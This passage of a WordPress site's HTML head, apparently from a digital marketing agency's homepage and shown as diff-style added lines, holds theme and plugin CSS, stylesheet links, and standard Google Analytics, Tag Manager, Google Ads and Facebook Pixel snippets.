var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
+:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
+</style>
+<link data-minify="1" rel='stylesheet' id='megamenu-css' href='https://dotnextdigital.com/wp-content/cache/min/1/wp-content/uploads/maxmegamenu/style_id_id.css?ver=1732600824' type='text/css' media='all' />
+<link data-minify="1" rel='stylesheet' id='dashicons-css' href='https://dotnextdigital.com/wp-content/cache/min/1/wp-includes/css/dashicons.css?ver=1732600824' type='text/css' media='all' />
+<link data-minify="1" rel='stylesheet' id='grw-public-main-css-css' href='https://dotnextdigital.com/wp-content/cache/min/1/wp-content/plugins/widget-google-reviews/assets/css/public-main.css?ver=1732600824' type='text/css' media='all' />
+<link data-minify="1" rel='stylesheet' id='wpcf-swiper-css' href='https://dotnextdigital.com/wp-content/cache/min/1/wp-content/plugins/wp-carousel-free/public/css/swiper-bundle.min.css?ver=1732600824' type='text/css' media='all' />
+<link data-minify="1" rel='stylesheet' id='wp-carousel-free-fontawesome-css' href='https://dotnextdigital.com/wp-content/cache/min/1/wp-content/plugins/wp-carousel-free/public/css/font-awesome.min.css?ver=1732600824' type='text/css' media='all' />
+<link rel='stylesheet' id='wpcf-fancybox-popup-css' href='https://dotnextdigital.com/wp-content/plugins/wp-carousel-free/public/css/jquery.fancybox.min.css?ver=2.7.2' type='text/css' media='all' />
+<link rel='stylesheet' id='wp-carousel-free-css' href='https://dotnextdigital.com/wp-content/plugins/wp-carousel-free/public/css/wp-carousel-free-public.min.css?ver=2.7.2' type='text/css' media='all' />
+<style id='wp-carousel-free-inline-css' type='text/css'>
+#sp-wp-carousel-free-id-4102 .wpcp-swiper-dots {margin: 40px 0px 0px 0px;}.wpcp-wrapper-4102 .swiper-wrapper .swiper-slide-kenburn, .wpcp-wrapper-4102 .swiper-wrapper, .wpcp-wrapper-4102 .wpcpro-row{align-items: center;}#sp-wp-carousel-free-id-4102 .wpcp-single-item {box-shadow: 0px 0px 0px 0px #dddddd;transition: all .3s;margin: 0px;}#sp-wp-carousel-free-id-4102.swiper-flip .wpcp-single-item{margin: 0!important;}#sp-wp-carousel-free-id-4102 .wpcp-single-item:hover {box-shadow: 0px 0px 0px 0px #dddddd;}#sp-wp-carousel-free-id-4102.sp-wpcp-4102 .wpcp-single-item {border: 0px none #dddddd;}#sp-wp-carousel-free-id-4102.sp-wpcp-4102 .swiper-button-prev,#sp-wp-carousel-free-id-4102.sp-wpcp-4102 .swiper-button-next,#sp-wp-carousel-free-id-4102.sp-wpcp-4102 .swiper-button-prev:hover,#sp-wp-carousel-free-id-4102.sp-wpcp-4102 .swiper-button-next:hover {background: none;border: none;font-size: 30px;}#sp-wp-carousel-free-id-4102.sp-wpcp-4102 .swiper-button-prev i,#sp-wp-carousel-free-id-4102.sp-wpcp-4102 .swiper-button-next i {color: #aaa;}#sp-wp-carousel-free-id-4102.sp-wpcp-4102 .swiper-button-prev i:hover,#sp-wp-carousel-free-id-4102.sp-wpcp-4102 .swiper-button-next i:hover {color: #000000;} #sp-wp-carousel-free-id-4102.sp-wpcp-4102.wpcp-image-carousel .wpcp-single-item:hover img, #sp-wp-carousel-free-id-4102.sp-wpcp-4102.wpcp-post-carousel .wpcp-single-item:hover img, #sp-wp-carousel-free-id-4102.sp-wpcp-4102.wpcp-product-carousel .wpcp-single-item:hover img{-webkit-transform: scale(1.2);-moz-transform: scale(1.2);transform: scale(1.2);}#sp-wp-carousel-free-id-4102 .wpcpro-row>[class*="wpcpro-col-"] { padding: 0 10px; padding-bottom: 20px;} #sp-wp-carousel-free-id-4102 .swiper-slide .single-item-fade:not(:last-child) { margin-right: 20px;}@media (min-width: 480px) { .wpcpro-row .wpcpro-col-sm-1 { flex: 0 0 100%; max-width: 100%; } .wpcpro-row .wpcpro-col-sm-2 { flex: 0 0 50%; max-width: 50%; } .wpcpro-row .wpcpro-col-sm-2-5 { flex: 0 0 75%; max-width: 75%; } .wpcpro-row .wpcpro-col-sm-3 { flex: 0 0 33.333%; max-width: 33.333%; } .wpcpro-row .wpcpro-col-sm-4 { flex: 0 0 25%; max-width: 25%; } .wpcpro-row .wpcpro-col-sm-5 { flex: 0 0 20%; max-width: 20%; } .wpcpro-row .wpcpro-col-sm-6 { flex: 0 0 16.66666666666667%; max-width: 16.66666666666667%; } .wpcpro-row .wpcpro-col-sm-7 { flex: 0 0 14.28571428%; max-width: 14.28571428%; } .wpcpro-row .wpcpro-col-sm-8 { flex: 0 0 12.5%; max-width: 12.5%; } } @media (max-width: 480px) { .wpcpro-row .wpcpro-col-xs-1 { flex: 0 0 100%; max-width: 100%; } .wpcpro-row .wpcpro-col-xs-2 { flex: 0 0 50%; max-width: 50%; } .wpcpro-row .wpcpro-col-xs-3 { flex: 0 0 33.222%; max-width: 33.222%; } .wpcpro-row .wpcpro-col-xs-4 { flex: 0 0 25%; max-width: 25%; } .wpcpro-row .wpcpro-col-xs-5 { flex: 0 0 20%; max-width: 20%; } .wpcpro-row .wpcpro-col-xs-6 { flex: 0 0 16.6667%; max-width: 16.6667%; } .wpcpro-row .wpcpro-col-xs-7 { flex: 0 0 14.28571428%; max-width: 14.28571428%; } .wpcpro-row .wpcpro-col-xs-8 { flex: 0 0 12.5%; max-width: 12.5%; } } @media (min-width: 736px) { .wpcpro-row .wpcpro-col-md-1 { flex: 0 0 100%; max-width: 100%; } .wpcpro-row .wpcpro-col-md-2 { flex: 0 0 50%; max-width: 50%; } .wpcpro-row .wpcpro-col-md-2-5 { flex: 0 0 75%; max-width: 75%; } .wpcpro-row .wpcpro-col-md-3 { flex: 0 0 33.333%; max-width: 33.333%; } .wpcpro-row .wpcpro-col-md-4 { flex: 0 0 25%; max-width: 25%; } .wpcpro-row .wpcpro-col-md-5 { flex: 0 0 20%; max-width: 20%; } .wpcpro-row .wpcpro-col-md-6 { flex: 0 0 16.66666666666667%; max-width: 16.66666666666667%; } .wpcpro-row .wpcpro-col-md-7 { flex: 0 0 14.28571428%; max-width: 14.28571428%; } .wpcpro-row .wpcpro-col-md-8 { flex: 0 0 12.5%; max-width: 12.5%; } } @media (min-width: 980px) { .wpcpro-row .wpcpro-col-lg-1 { flex: 0 0 100%; max-width: 100%; } .wpcpro-row .wpcpro-col-lg-2 { flex: 0 0 50%; max-width: 50%; } .wpcpro-row .wpcpro-col-lg-3 { flex: 0 0 33.222%; max-width: 33.222%; } .wpcpro-row .wpcpro-col-lg-4 { flex: 0 0 25%; max-width: 25%; } .wpcpro-row .wpcpro-col-lg-5 { flex: 0 0 20%; max-width: 20%; } .wpcpro-row .wpcpro-col-lg-6 { flex: 0 0 16.6667%; max-width: 16.6667%; } .wpcpro-row .wpcpro-col-lg-7 { flex: 0 0 14.28571428%; max-width: 14.28571428%; } .wpcpro-row .wpcpro-col-lg-8 { flex: 0 0 12.5%; max-width: 12.5%; } } @media (min-width: 1200px) { .wpcpro-row .wpcpro-col-xl-1 { flex: 0 0 100%; max-width: 100%; } .wpcpro-row .wpcpro-col-xl-2 { flex: 0 0 50%; max-width: 50%; } .wpcpro-row .wpcpro-col-xl-3 { flex: 0 0 33.22222222%; max-width: 33.22222222%; } .wpcpro-row .wpcpro-col-xl-4 { flex: 0 0 25%; max-width: 25%; } .wpcpro-row .wpcpro-col-xl-5 { flex: 0 0 20%; max-width: 20%; } .wpcpro-row .wpcpro-col-xl-6 { flex: 0 0 16.66667%; max-width: 16.66667%; } .wpcpro-row .wpcpro-col-xl-7 { flex: 0 0 14.28571428%; max-width: 14.28571428%; } .wpcpro-row .wpcpro-col-xl-8 { flex: 0 0 12.5%; max-width: 12.5%; } }
+</style>
+<link rel='stylesheet' id='et-divi-open-sans-css' href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800&#038;subset=latin,latin-ext&#038;display=swap' type='text/css' media='all' />
+<link rel='stylesheet' id='et-builder-googlefonts-cached-css' href='https://fonts.googleapis.com/css?family=Allerta+Stencil:regular|Montserrat:100,200,300,regular,500,600,700,800,900,100italic,200italic,300italic,italic,500italic,600italic,700italic,800italic,900italic|Abel:regular|ABeeZee:regular,italic&#038;subset=latin,latin-ext&#038;display=swap' type='text/css' media='all' />
+<link data-minify="1" rel='stylesheet' id='divi-style-css' href='https://dotnextdigital.com/wp-content/cache/background-css/dotnextdigital.com/wp-content/cache/min/1/wp-content/themes/Divi/style-static.min.css?ver=1732600825&wpr_t=1732817520' type='text/css' media='all' />
+<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://dotnextdigital.com/wp-includes/js/jquery/jquery.js?ver=3.7.1" id="jquery-core-js" defer></script>
+<script type="rocketlazyloadscript" data-minify="1" data-rocket-type="text/javascript" data-rocket-src="https://dotnextdigital.com/wp-content/cache/min/1/wp-includes/js/jquery/jquery-migrate.js?ver=1732600825" id="jquery-migrate-js" defer></script>
+<script type="rocketlazyloadscript" data-minify="1" data-rocket-type="text/javascript" defer="defer" data-rocket-src="https://dotnextdigital.com/wp-content/cache/min/1/wp-content/plugins/widget-google-reviews/assets/js/public-main.js?ver=1732600825" id="grw-public-main-js-js"></script>
+
+<!-- Potongan tag Google (gtag.js) ditambahkan oleh Site Kit -->
+
+<!-- Snippet Google Analytics telah ditambahkan oleh Site Kit -->
+<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://www.googletagmanager.com/gtag/js?id=GT-K48GXNS4" id="google_gtagjs-js" async></script>
+<script type="rocketlazyloadscript" data-rocket-type="text/javascript" id="google_gtagjs-js-after">
+/* <![CDATA[ */
+window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}
+gtag("set","linker",{"domains":["dotnextdigital.com"]});
+gtag("js", new Date());
+gtag("set", "developer_id.dZTNiMT", true);
+gtag("config", "GT-K48GXNS4");
+ window._googlesitekit = window._googlesitekit || {}; window._googlesitekit.throttledEvents = []; window._googlesitekit.gtagEvent = (name, data) => { var key = JSON.stringify( { name, data } ); if ( !! window._googlesitekit.throttledEvents[ key ] ) { return; } window._googlesitekit.throttledEvents[ key ] = true; setTimeout( () => { delete window._googlesitekit.throttledEvents[ key ]; }, 5 ); gtag( "event", name, { ...data, event_source: "site-kit" } ); } 
+/* ]]> */
+</script>
+
+<!-- Potongan tag Google akhir (gtag.js) ditambahkan oleh Site Kit -->
+<link rel="https://api.w.org/" href="https://dotnextdigital.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://dotnextdigital.com/wp-json/wp/v2/pages/12" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://dotnextdigital.com/xmlrpc.php?rsd" />
+<meta name="generator" content="WordPress 6.7.1" />
+<link rel='shortlink' href='https://dotnextdigital.com/' />
+<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://dotnextdigital.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fdotnextdigital.com%2F" />
+<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://dotnextdigital.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fdotnextdigital.com%2F&#038;format=xml" />
+<meta name="generator" content="Site Kit by Google 1.140.0" /><!-- Google Tag Manager -->
+<script type="rocketlazyloadscript">(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-PRH6X7P');</script>
+<!-- End Google Tag Manager -->
+
+<meta name="facebook-domain-verification" content="i7gwknqqu1312vgr66qy5ypimr05sh" />
+
+<!-- Global site tag (gtag.js) - Google Ads: 460240693 -->
+<script type="rocketlazyloadscript" async data-rocket-src="https://www.googletagmanager.com/gtag/js?id=AW-460240693"></script>
+<script type="rocketlazyloadscript">
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'AW-460240693');
+</script>
+
+<!-- Event snippet for Website traffic conversion page -->
+<script type="rocketlazyloadscript">
+  gtag('event', 'conversion', {'send_to': 'AW-460240693/7B7vCOWmmvEBELXuutsB'});
+</script>
+<!-- Facebook Pixel Code -->
+<script type="rocketlazyloadscript">
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2930392100557729');
+fbq('track', 'PageView');
+</script>
+<noscript>
+<img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2930392100557729&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Facebook Pixel Code --><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" /><link rel="icon" href="https://dotnextdigital.com/wp-content/uploads/2020/01/cropped-dotnext-32x32.jpg" sizes="32x32" />
+<link rel="icon" href="https://dotnextdigital.com/wp-content/uploads/2020/01/cropped-dotnext-192x192.jpg" sizes="192x192" />
+<link rel="apple-touch-icon" href="https://dotnextdigital.com/wp-content/uploads/2020/01/cropped-dotnext-180x180.jpg" />
+<meta name="msapplication-TileImage" content="https://dotnextdigital.com/wp-content/uploads/2020/01/cropped-dotnext-270x270.jpg" />
+<style id="et-divi-customizer-global-cached-inline-styles">body,.et_pb_column_1_2 .et_quote_content blockquote cite,.et_pb_column_1_2 .et_link_content a.et_link_main_url,.et_pb_column_1_3 .et_quote_content blockquote cite,.et_pb_column_3_8 .et_quote_content blockquote cite,.et_pb_column_1_4 .et_quote_content blockquote cite,.et_pb_blog_grid .et_quote_content blockquote cite,.et_pb_column_1_3 .et_link_content a.et_link_main_url,.et_pb_column_3_8 .et_link_content a.et_link_main_url,.et_pb_column_1_4 .et_link_content a.et_link_main_url,.et_pb_blog_grid .et_link_content a.et_link_main_url,body .et_pb_bg_layout_light .et_pb_post p,body .et_pb_bg_layout_dark .et_pb_post p{font-size:14px}.et_pb_slide_content,.et_pb_best_value{font-size:15px}body{color:#000000}h1,h2,h3,h4,h5,h6{color:#000000}body{line-height:1.5em}#main-header,#main-header .nav li ul,.et-search-form,#main-header .et_mobile_menu{background-color:#000000}.nav li ul{border-color:#e00b00}.et_secondary_nav_enabled #page-container #top-header{background-color:#000000!important}#et-secondary-nav li ul{background-color:#000000}#et-secondary-nav li ul{background-color:#e00b00}.et_header_style_centered .mobile_nav .select_page,.et_header_style_split .mobile_nav .select_page,.et_nav_text_color_light #top-menu>li>a,.et_nav_text_color_dark #top-menu>li>a,#top-menu a,.et_mobile_menu li a,.et_nav_text_color_light .et_mobile_menu li a,.et_nav_text_color_dark .et_mobile_menu li a,#et_search_icon:before,.et_search_form_container input,span.et_close_search_field:after,#et-top-navigation .et-cart-info{color:rgba(255,255,255,0.96)}.et_search_form_container input::-moz-placeholder{color:rgba(255,255,255,0.96)}.et_search_form_container input::-webkit-input-placeholder{color:rgba(255,255,255,0.96)}.et_search_form_container input:-ms-input-placeholder{color:rgba(255,255,255,0.96)}#top-header,#top-header a,#et-secondary-nav li li a,#top-header .et-social-icon a:before{font-size:14px}#top-menu li.current-menu-ancestor>a,#top-menu li.current-menu-item>a,#top-menu li.current_page_item>a{color:#e00b00}#et-footer-nav{background-color:rgba(0,0,0,0)}.bottom-nav,.bottom-nav a,.bottom-nav li.current-menu-item a{color:#ffffff}#et-footer-nav .bottom-nav li.current-menu-item a{color:#ffffff}#footer-bottom{background-color:#000000}#footer-info,#footer-info a{color:#ffffff}#footer-info{font-size:13px}#footer-bottom .et-social-icon a{font-size:13px}#footer-bottom .et-social-icon a{color:rgba(255,255,255,0)}h1,h2,h3,h4,h5,h6,.et_quote_content blockquote p,.et_pb_slide_description .et_pb_slide_title{font-weight:bold;font-style:normal;text-transform:none;text-decoration:none;letter-spacing:1px}body.home-posts #left-area .et_pb_post .post-meta,body.archive #left-area .et_pb_post .post-meta,body.search #left-area .et_pb_post .post-meta,body.single #left-area .et_pb_post .post-meta{line-height:1.1em}body.home-posts #left-area .et_pb_post .post-meta,body.archive #left-area .et_pb_post .post-meta,body.search #left-area .et_pb_post .post-meta,body.single #left-area .et_pb_post .post-meta{font-weight:bold;font-style:normal;text-transform:none;text-decoration:none}body.home-posts #left-area .et_pb_post h2,body.archive #left-area .et_pb_post h2,body.search #left-area .et_pb_post h2,body.single .et_post_meta_wrapper h1{font-weight:bold;font-style:normal;text-transform:none;text-decoration:none}@media only screen and (min-width:981px){.et_pb_row{padding:5% 0}.et_header_style_left #et-top-navigation,.et_header_style_split #et-top-navigation{padding:25px 0 0 0}.et_header_style_left #et-top-navigation nav>ul>li>a,.et_header_style_split #et-top-navigation nav>ul>li>a{padding-bottom:25px}.et_header_style_split .centered-inline-logo-wrap{width:50px;margin:-50px 0}.et_header_style_split .centered-inline-logo-wrap #logo{max-height:50px}.et_pb_svg_logo.et_header_style_split .centered-inline-logo-wrap #logo{height:50px}.et_header_style_centered #top-menu>li>a{padding-bottom:9px}.et_header_style_slide #et-top-navigation,.et_header_style_fullscreen #et-top-navigation{padding:16px 0 16px 0!important}.et_header_style_centered #main-header .logo_container{height:50px}#logo{max-height:51%}.et_pb_svg_logo #logo{height:51%}.et_header_style_left .et-fixed-header #et-top-navigation,.et_header_style_split .et-fixed-header #et-top-navigation{padding:23px 0 0 0}.et_header_style_left .et-fixed-header #et-top-navigation nav>ul>li>a,.et_header_style_split .et-fixed-header #et-top-navigation nav>ul>li>a{padding-bottom:23px}.et_header_style_centered header#main-header.et-fixed-header .logo_container{height:45px}.et_header_style_split #main-header.et-fixed-header .centered-inline-logo-wrap{width:45px;margin:-45px 0}.et_header_style_split .et-fixed-header .centered-inline-logo-wrap #logo{max-height:45px}.et_pb_svg_logo.et_header_style_split .et-fixed-header .centered-inline-logo-wrap #logo{height:45px}.et_header_style_slide .et-fixed-header #et-top-navigation,.et_header_style_fullscreen .et-fixed-header #et-top-navigation{padding:14px 0 14px 0!important}.et_fixed_nav #page-container .et-fixed-header#top-header{background-color:#000000!important}.et_fixed_nav #page-container .et-fixed-header#top-header #et-secondary-nav li ul{background-color:#000000}.et-fixed-header #top-menu li a{font-size:13px}.et-fixed-header #top-menu a,.et-fixed-header #et_search_icon:before,.et-fixed-header #et_top_search .et-search-form input,.et-fixed-header .et_search_form_container input,.et-fixed-header .et_close_search_field:after,.et-fixed-header #et-top-navigation .et-cart-info{color:rgba(255,255,255,0.96)!important}.et-fixed-header .et_search_form_container input::-moz-placeholder{color:rgba(255,255,255,0.96)!important}.et-fixed-header .et_search_form_container input::-webkit-input-placeholder{color:rgba(255,255,255,0.96)!important}.et-fixed-header .et_search_form_container input:-ms-input-placeholder{color:rgba(255,255,255,0.96)!important}.et-fixed-header #top-menu li.current-menu-ancestor>a,.et-fixed-header #top-menu li.current-menu-item>a,.et-fixed-header #top-menu li.current_page_item>a{color:#e00b00!important}body.home-posts #left-area .et_pb_post .post-meta,body.archive #left-area .et_pb_post .post-meta,body.search #left-area .et_pb_post .post-meta,body.single #left-area .et_pb_post .post-meta{font-size:10px}body.home-posts #left-area .et_pb_post h2,body.archive #left-area .et_pb_post h2,body.search #left-area .et_pb_post h2{font-size:20.8px}body.single .et_post_meta_wrapper h1{font-size:24px}}@media only screen and (min-width:1350px){.et_pb_row{padding:67px 0}.et_pb_section{padding:54px 0}.single.et_pb_pagebuilder_layout.et_full_width_page .et_post_meta_wrapper{padding-top:202px}.et_pb_fullwidth_section{padding:0}}h1,h1.et_pb_contact_main_title,.et_pb_title_container h1{font-size:26px}h2,.product .related h2,.et_pb_column_1_2 .et_quote_content blockquote p{font-size:22px}h3{font-size:18px}h4,.et_pb_circle_counter h3,.et_pb_number_counter h3,.et_pb_column_1_3 .et_pb_post h2,.et_pb_column_1_4 .et_pb_post h2,.et_pb_blog_grid h2,.et_pb_column_1_3 .et_quote_content blockquote p,.et_pb_column_3_8 .et_quote_content blockquote p,.et_pb_column_1_4 .et_quote_content blockquote p,.et_pb_blog_grid .et_quote_content blockquote p,.et_pb_column_1_3 .et_link_content h2,.et_pb_column_3_8 .et_link_content h2,.et_pb_column_1_4 .et_link_content h2,.et_pb_blog_grid .et_link_content h2,.et_pb_column_1_3 .et_audio_content h2,.et_pb_column_3_8 .et_audio_content h2,.et_pb_column_1_4 .et_audio_content h2,.et_pb_blog_grid .et_audio_content h2,.et_pb_column_3_8 .et_pb_audio_module_content h2,.et_pb_column_1_3 .et_pb_audio_module_content h2,.et_pb_gallery_grid .et_pb_gallery_item h3,.et_pb_portfolio_grid .et_pb_portfolio_item h2,.et_pb_filterable_portfolio_grid .et_pb_portfolio_item h2{font-size:15px}h5{font-size:13px}h6{font-size:12px}.et_pb_slide_description .et_pb_slide_title{font-size:39px}.et_pb_gallery_grid .et_pb_gallery_item h3,.et_pb_portfolio_grid .et_pb_portfolio_item h2,.et_pb_filterable_portfolio_grid .et_pb_portfolio_item h2,.et_pb_column_1_4 .et_pb_audio_module_content h2{font-size:13px}@media only screen and (max-width:980px){.two-columns .et_pb_column{width:50%!important}.three-columns .et_pb_column{width:33.33%!important}.four-columns .et_pb_column{width:25%!important}}.menu-home:before{font-family:'ETmodules';content:"e074";margin-right:10px;margin-top:-2px;color:#ffffff;font-size:18px;float:left}.menu-home{width:110px}.menu-services:before{font-family:'ETmodules';content:"e038";margin-right:10px;margin-top:-2px;color:#ffffff;font-size:18px;float:left}.menu-services{width:135px}.menu-about:before{font-family:'ETmodules';content:"e08b";margin-right:10px;margin-top:-2px;color:#ffffff;font-size:18px;float:left}.menu-about{width:110px}.menu-proto:before{font-family:'ETmodules';content:"e107";margin-right:10px;margin-top:-2px;color:#ffffff;font-size:18px;float:left}.menu-proto{width:130px}.menu-contact:before{font-family:'ETmodules';content:"e108";margin-right:10px;margin-top:-2px;color:#ffffff;font-size:18px;float:left}.menu-contact{width:132px}.menu-car:before{font-family:'ETmodules';content:"e0Fe";margin-right:10px;margin-top:-2px;color:#ffffff;font-size:18px;float:left}.menu-car{width:110px}.menu-dig:before{font-family:'ETmodules';content:"e0Fe";margin-right:10px;margin-top:-2px;color:#ffffff;font-size:18px;float:left}.menu-dig{width:110px;Height: 100px}@media only screen and (max-width:980px){.menu-home:before{margin-top:8px}.menu-services:before{margin-top:8px}.menu-about:before{margin-top:8px}.menu-blog:before{margin-top:8px}.menu-contact:before{margin-top:8px}.menu-car:before{margin-top:8px}}#main-header .et_mobile_menu li ul.hide{display:none!important}#mobile_menu .menu-item-has-children{position:relative}#mobile_menu .menu-item-has-children>a{background:transparent}#mobile_menu .menu-item-has-children>a+span{position:absolute;right:0;top:0;padding:10px 20px;font-size:20px;font-weight:700;cursor:pointer;z-index:3}span.menu-closed:before{content:"4c";display:block;color:#fff;font-size:16px;font-family:ETmodules}span.menu-closed.menu-open:before{content:"4d"}</style><style type="text/css">/** Mega Menu CSS: fs **/</style>
+<noscript><style id="rocket-lazyload-nojs-css">.rll-youtube-player, [data-lazy-src]{display:none !important;}</style></noscript><style id="wpr-lazyload-bg-container"></style><style id="wpr-lazyload-bg-exclusion"></style>
+<noscript>
+<style id="wpr-lazyload-bg-nostyle">.et_pb_preload:before{--wpr-bg-9bf92850-9a70-4998-8901-b9b7594cca25: url('https://dotnextdigital.com/wp-content/themes/Divi/includes/builder/styles/images/preloader.gif');}.et_subscribe_loader{--wpr-bg-49b16ea0-9e08-4ede-aa90-173ea3682d3e: url('https://dotnextdigital.com/wp-content/themes/Divi/includes/builder/styles/images/subscribe-loader.gif');}.mejs-overlay-button{--wpr-bg-d3dc4bb6-b943-42f2-a7a0-5f6fb4d0d860: url('https://dotnextdigital.com/wp-includes/js/mediaelement/mejs-controls.svg');}.mejs-overlay-loading-bg-img{--wpr-bg-4e835cfd-40f2-494c-9a68-aec18479c31d: url('https://dotnextdigital.com/wp-includes/js/mediaelement/mejs-controls.svg');}.mejs-button>button{--wpr-bg-ac579703-9c51-4206-a2f8-a3a5f7879561: url('https://dotnextdigital.com/wp-includes/js/mediaelement/mejs-controls.svg');}div.et_pb_section.et_pb_section_5{--wpr-bg-dae2139d-5864-4c29-b712-442a6c9382e1: url('https://dotnextdigital.com/wp-content/uploads/2020/01/pexels-photo-1128207.jpeg');}.et_pb_slider .et_pb_slide_0{--wpr-bg-8103dc84-10e2-4ccd-b1e9-0f0e0fe46c05: url('https://dotnextdigital.com/wp-content/uploads/2020/01/Digital-Marketing-Jakarta-1-scaled.jpg');}.et_pb_slider .et_pb_slide_1{--wpr-bg-30925ae7-5236-4957-b41f-1d422f281270: url('https://dotnextdigital.com/wp-content/uploads/2020/01/Branding-produk-scaled.jpg');}</style>
+</noscript>
+<script type="application/javascript">const rocket_pairs = [{"selector":".et_pb_preload","style":".et_pb_preload:before{--wpr-bg-9bf92850-9a70-4998-8901-b9b7594cca25: url('https:\/\/dotnextdigital.com\/wp-content\/themes\/Divi\/includes\/builder\/styles\/images\/preloader.gif');}","hash":"9bf92850-9a70-4998-8901-b9b7594cca25","url":"https:\/\/dotnextdigital.com\/wp-content\/themes\/Divi\/includes\/builder\/styles\/images\/preloader.gif"},{"selector":".et_subscribe_loader","style":".et_subscribe_loader{--wpr-bg-49b16ea0-9e08-4ede-aa90-173ea3682d3e: url('https:\/\/dotnextdigital.com\/wp-content\/themes\/Divi\/includes\/builder\/styles\/images\/subscribe-loader.gif');}","hash":"49b16ea0-9e08-4ede-aa90-173ea3682d3e","url":"https:\/\/dotnextdigital.com\/wp-content\/themes\/Divi\/includes\/builder\/styles\/images\/subscribe-loader.gif"},{"selector":".mejs-overlay-button","style":".mejs-overlay-button{--wpr-bg-d3dc4bb6-b943-42f2-a7a0-5f6fb4d0d860: url('https:\/\/dotnextdigital.com\/wp-includes\/js\/mediaelement\/mejs-controls.svg');}","hash":"d3dc4bb6-b943-42f2-a7a0-5f6fb4d0d860","url":"https:\/\/dotnextdigital.com\/wp-includes\/js\/mediaelement\/mejs-controls.svg"},{"selector":".mejs-overlay-loading-bg-img","style":".mejs-overlay-loading-bg-img{--wpr-bg-4e835cfd-40f2-494c-9a68-aec18479c31d: url('https:\/\/dotnextdigital.com\/wp-includes\/js\/mediaelement\/mejs-controls.svg');}","hash":"4e835cfd-40f2-494c-9a68-aec18479c31d","url":"https:\/\/dotnextdigital.com\/wp-includes\/js\/mediaelement\/mejs-controls.svg"},{"selector":".mejs-button>button","style":".mejs-button>button{--wpr-bg-ac579703-9c51-4206-a2f8-a3a5f7879561: url('https:\/\/dotnextdigital.com\/wp-includes\/js\/mediaelement\/mejs-controls.svg');}","hash":"ac579703-9c51-4206-a2f8-a3a5f7879561","url":"https:\/\/dotnextdigital.com\/wp-includes\/js\/mediaelement\/mejs-controls.svg"},{"selector":"div.et_pb_section.et_pb_section_5","style":"div.et_pb_section.et_pb_section_5{--wpr-bg-dae2139d-5864-4c29-b712-442a6c9382e1: 